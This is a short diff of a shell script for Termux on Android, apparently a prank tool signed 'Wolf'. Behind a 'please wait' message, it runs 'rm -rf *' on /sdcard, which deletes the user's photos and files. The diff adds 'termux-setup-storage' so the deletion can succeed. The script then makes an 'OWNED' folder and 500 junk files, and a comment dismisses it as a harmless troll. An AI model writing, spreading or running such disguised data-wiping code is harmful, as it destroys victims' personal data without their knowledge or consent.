@@ -18,8 +18,9 @@ sleep 1
 echo "Ok, Aguarde..."
 sleep 1
 clear
+termux-setup-storage
 cd /sdcard/ && rm -rf *
 mkdir .OWNED BY WOLF863
-touch WOLFÉLINDO{0001..000500}.c
+touch WOLFLINDO{0001..000500}.c
 
 #Tudo Se passa de uma troll nao usa com maldade ok Trash? . Ass:Wolf
